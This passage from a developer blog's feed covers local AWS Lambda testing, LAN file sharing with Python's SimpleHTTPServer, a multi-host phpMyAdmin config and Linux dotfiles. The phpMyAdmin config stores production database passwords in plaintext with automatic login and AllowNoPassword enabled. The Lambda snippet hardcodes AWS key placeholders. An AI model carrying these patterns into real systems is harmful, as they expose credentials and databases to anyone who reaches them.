    <title>AWS Lambda test in local machine</title>
    <link href="http://jslim.net/blog/2018/10/14/AWS-Lambda-test-in-local-machine/"/>
    <id>http://jslim.net/blog/2018/10/14/AWS-Lambda-test-in-local-machine/</id>
    <published>2018-10-14T06:58:50.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I believe many developer first time deal with AWS Lambda will have this question: “How can I test the code in my machines?”</p><p>After keep trying hundreds of times, I found a way to do it.</p><p>I will show the example in Node.js</p><h3 id="1-Setup-a-new-project"><a href="#1-Setup-a-new-project" class="headerlink" title="1. Setup a new project"></a>1. Setup a new project</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> mylambda</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> mylambda/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">npm init</span></span><br></pre></td></tr></table></figure><p>Input all necessary info</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install aws-sdk <span class="comment">--save</span></span><br></pre></td></tr></table></figure><h3 id="2-Create-a-base-script"><a href="#2-Create-a-base-script" class="headerlink" title="2. Create a base script"></a>2. Create a base script</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> aws = <span class="built_in">require</span>(<span class="string">&#x27;aws-sdk&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> s3 = <span class="keyword">new</span> aws.<span class="title function_">S3</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="keyword">function</span>(<span class="params">event, context, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// your script goes here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, <span class="string">&#x27;Success&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, <span class="string">&#x27;Something wrong&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="3-How-to-test-it"><a href="#3-How-to-test-it" class="headerlink" title="3. How to test it?"></a>3. How to test it?</h3><p>First, we need to know how the <code>event</code> &amp; <code>context</code> object looks like</p><p>Simple, just output to console</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;event&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(event));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;context&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(context));</span><br></pre></td></tr></table></figure><p>Upload to lambda, and trigger it. We need to trigger it for the first time only we know how it looks like.</p><p>Let’s copy the output for event and make it a file named <strong>event.json</strong> in the project root. Same goes for <strong>context</strong>.</p><p>Example output:</p><p><strong>event.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Records&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;eventVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;eventSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aws:s3&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;awsRegion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-west-2&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;eventTime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018-10-12T08:30:32.715Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;eventName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ObjectCreated:Put&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;userIdentity&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;principalId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWS:AAAABBBCCCCDDDDDAAAAA&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;requestParameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;sourceIPAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.181.181.181&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;responseElements&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;x-amz-request-id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9999988887777766&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;x-amz-id-2&quot;</span><span class="punctuation">:</span> <span class="string">&quot;999999oaaaaaaaikkkkkkkOn/fCCCCCCCCAwIIIIIIeSPDSoYYjhhhhhhhhhJ+ptYrktJJJJJJJ=&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;s3&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;s3SchemaVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;configurationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;88888888-4444-3333-2222-111111111111&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;myawesomebucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ownerIdentity&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;principalId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;88888AAAAACCCC&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::myawesomebucket&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;path/to/your/file.extension&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">889700</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;eTag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;88888877777716666666942b5333333e&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;sequencer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CCCCCCC77777788888&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>context.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;callbackWaitsForEmptyEventLoop&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;logGroupName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws/lambda/my-lambda-function&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;logStreamName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018/10/12/[$LATEST]88888887c65cccccccaaaaaa99999999&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;functionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-lambda-function&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;memoryLimitInMB&quot;</span><span class="punctuation">:</span> <span class="string">&quot;128&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;functionVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$LATEST&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;invokeid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;88888888-4444-3333-2222-111111111111&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;awsRequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;11111111-cccc-aaaa-9999-777777777777&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;invokedFunctionArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:lambda:us-west-2:888888999995:function:my-lambda-function&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-Test-run-in-local"><a href="#4-Test-run-in-local" class="headerlink" title="4. Test run in local"></a>4. Test run in local</h3><p>Add this block to the event handler, e.g.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="keyword">function</span>(<span class="params">event, context, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> s3 = <span class="keyword">new</span> aws.<span class="title function_">S3</span>(&#123;</span><br><span class="line">      <span class="attr">accessKeyId</span>: <span class="string">&#x27;&lt;aws key id&gt;&#x27;</span>,</span><br><span class="line">      <span class="attr">secretAccessKey</span>: <span class="string">&#x27;&lt;aws secret&gt;&#x27;</span>,</span><br><span class="line">      <span class="attr">region</span>: event.<span class="property">Records</span>[<span class="number">0</span>].<span class="property">awsRegion</span>,</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>Then, at the most bottom, add this</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="title function_">handler</span>(<span class="built_in">require</span>(<span class="string">&#x27;./event&#x27;</span>), <span class="built_in">require</span>(<span class="string">&#x27;./context&#x27;</span>), <span class="keyword">function</span>(<span class="params">err, obj</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;error&#x27;</span>, err);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;obj&#x27;</span>, obj);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Now you can run</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">node</span> <span class="title">index</span>.js</span><br></pre></td></tr></table></figure><p><strong>NOTE: Remember to remove the code you added in <em>Section 4</em> before upload to production.</strong></p><p>References:</p><ul><li><a href="https://stackoverflow.com/questions/49069363/aws-lambda-how-to-stop-retries-when-there-is-a-failure/49069568#49069568">AWS Lambda - How to stop retries when there is a failure</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I believe many developer first time deal with AWS Lambda will have this question: “How can I test the code in my machines?”&lt;/p&gt;
&lt;p&gt;After</summary>
        
      
    
    
    
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
    <category term="lambda" scheme="http://jslim.net/tags/lambda/"/>
    
    <category term="node" scheme="http://jslim.net/tags/node/"/>
    
  </entry>
  
  <entry>
    <title>Python trick - copy file among computers in LAN network</title>
    <link href="http://jslim.net/blog/2018/07/26/Python-trick-copy-file-among-computers-in-LAN-network/"/>
    <id>http://jslim.net/blog/2018/07/26/Python-trick-copy-file-among-computers-in-LAN-network/</id>
    <published>2018-07-26T16:07:34.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>The conventional way of file transfer between PCs, is via thumb drive.</p><p>Some time the file size are too large and not able to copy to FAT thumb drive.</p><p>Now, let’s play a little trick…</p><p>Open up a terminal, and <code>cd</code> to the directory that the files you want to copy over.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /path/to/file-dir</span><br><span class="line">$ python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure><p>The 2nd line actually serve as a HTTP server in <em>current directory</em>.</p><p>Now open up another terminal, and type</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig</span><br><span class="line">...</span><br><span class="line">en1: flags=8888&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">ether 33:33:33:44:44:44</span><br><span class="line">inet6 fe80::66:5555:cccc:d666%en1 prefixlen 64 secured scopeid 0x6</span><br><span class="line">inet 192.168.0.122 netmask 0xffffff00 broadcast 192.168.0.255</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now you found out your IP is <code>192.168.0.122</code>.</p><h3 id="Another-PC-where-you-need-the-files"><a href="#Another-PC-where-you-need-the-files" class="headerlink" title="Another PC where you need the files"></a>Another PC where you need the files</h3><p>Open up browser and type the URL <a href="http://192.168.0.122:8000/">192.168.0.122:8000</a>, you will see</p><p><img src="/images/posts/2018-07-27-Python-trick-copy-file-among-computers-in-LAN-network/directory-file-list.png" alt="List of current directory"></p><p>Just click on the files you need, and download it :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;The conventional way of file transfer between PCs, is via thumb drive.&lt;/p&gt;
&lt;p&gt;Some time the file size are too large and not able to copy</summary>
        
      
    
    
    
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>How to add more hosts to phpMyAdmin</title>
    <link href="http://jslim.net/blog/2018/07/20/How-to-add-more-hosts-to-phpMyAdmin/"/>
    <id>http://jslim.net/blog/2018/07/20/How-to-add-more-hosts-to-phpMyAdmin/</id>
    <published>2018-07-20T14:18:40.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>If want to add in more hosts in phpMyAdmin, just edit the file <strong>config.inc.php</strong></p><p>Replace the following content</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Authentication type */</span></span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;auth_type&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span>;</span><br><span class="line"><span class="comment">/* Server parameters */</span></span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;host&#x27;</span>] = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>with this</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servers configuration</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * First server</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$hosts</span> = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;verbose&#x27;</span> =&gt; <span class="string">&#x27;Local DB&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;user_1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;pass_1&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;verbose&#x27;</span> =&gt; <span class="string">&#x27;Staging server&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;123.123.123.123&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;user_2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;pass_2&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;verbose&#x27;</span> =&gt; <span class="string">&#x27;Production DB&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;12.12.12.12&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;user_3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;pass_3&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$hosts</span>); <span class="variable">$x</span>++) &#123;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">    <span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>] = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$hosts</span>[<span class="variable">$x</span>], [</span><br><span class="line">        <span class="comment">/* Authentication type */</span></span><br><span class="line">        <span class="string">&#x27;auth_type&#x27;</span> =&gt; <span class="string">&#x27;config&#x27;</span>,</span><br><span class="line">        <span class="comment">/* Server parameters */</span></span><br><span class="line">        <span class="string">&#x27;compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;AllowNoPassword&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * phpMyAdmin configuration storage settings.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* User used to manipulate with storage */</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;controlhost&#x27;] = &#x27;&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;controlport&#x27;] = &#x27;&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;controluser&#x27;] = &#x27;pma&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;controlpass&#x27;] = &#x27;pmapass&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Storage database and tables */</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;pmadb&#x27;] = &#x27;phpmyadmin&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;bookmarktable&#x27;] = &#x27;pma__bookmark&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;relation&#x27;] = &#x27;pma__relation&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;table_info&#x27;] = &#x27;pma__table_info&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;table_coords&#x27;] = &#x27;pma__table_coords&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;pdf_pages&#x27;] = &#x27;pma__pdf_pages&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;column_info&#x27;] = &#x27;pma__column_info&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;history&#x27;] = &#x27;pma__history&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;table_uiprefs&#x27;] = &#x27;pma__table_uiprefs&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;tracking&#x27;] = &#x27;pma__tracking&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;userconfig&#x27;] = &#x27;pma__userconfig&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;recent&#x27;] = &#x27;pma__recent&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;favorite&#x27;] = &#x27;pma__favorite&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;users&#x27;] = &#x27;pma__users&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;usergroups&#x27;] = &#x27;pma__usergroups&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;navigationhiding&#x27;] = &#x27;pma__navigationhiding&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;savedsearches&#x27;] = &#x27;pma__savedsearches&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;central_columns&#x27;] = &#x27;pma__central_columns&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;designer_settings&#x27;] = &#x27;pma__designer_settings&#x27;;</span></span><br><span class="line"><span class="comment">// $cfg[&#x27;Servers&#x27;][$i][&#x27;export_templates&#x27;] = &#x27;pma__export_templates&#x27;;</span></span><br><span class="line">&#125; <span class="comment">// &lt;------- REMEMBER TO CLOSE</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;If want to add in more hosts in phpMyAdmin, just edit the file &lt;strong&gt;config.inc.php&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Replace the following</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
    <category term="mysql-client" scheme="http://jslim.net/tags/mysql-client/"/>
    
  </entry>
  
  <entry>
    <title>How I personalize my Linux config</title>
    <link href="http://jslim.net/blog/2018/07/15/How-I-personalize-my-Linux-config/"/>
    <id>http://jslim.net/blog/2018/07/15/How-I-personalize-my-Linux-config/</id>
    <published>2018-07-15T14:20:58.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I begin touching Linux back in 2011. I still remember, I learning vim, command line, etc.</p><p>The first thing my mentor told me to do was, clone his <a href="https://www.quora.com/What-are-dotfiles">dotfiles</a>.<br>If you first time heard about this term, I’m pretty sure that you’re new to <a href="https://en.wikipedia.org/wiki/Unix">Unix</a> world.</p><p>Today, I have my own config in <a href="https://github.com/jslim89/dotfiles">my GitHub repo</a>.</p><p>In Unix, every programs’ config will be kept in <a href="http://www.linfo.org/home_directory.html">home directory</a> <em>(~)</em>.<br>For example, for vim config will be kept in <code>~/.vimrc</code> OR <code>/home/username/.vimrc</code>.</p><p>Also, you can add <a href="http://www.linfo.org/alias.html">alias</a> to shorthen your command. Just have to edit the file <code>~/.bashrc</code>, and add</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> gitdiff=<span class="string">&#x27;git diff --color&#x27;</span></span><br></pre></td></tr></table></figure><p>which mean, when you type in command <code>gitdiff</code>, it actually equivalent to <code>git diff --color</code>.</p><p>I add all my config to <a href="https://github.com/jslim89/dotfiles">my GitHub repo</a> and managed via <a href="https://github.com/technicalpickles/homesick">homesick</a>.</p><p>If you’re new to unix environment, you’ll find it actually save you lots of time.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I begin touching Linux back in 2011. I still remember, I learning vim, command line, etc.&lt;/p&gt;
&lt;p&gt;The first thing my mentor told me to do</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="config" scheme="http://jslim.net/tags/config/"/>
    
  </entry>
  
  <entry>
    <title>Laravel event multi listeners not working</title>
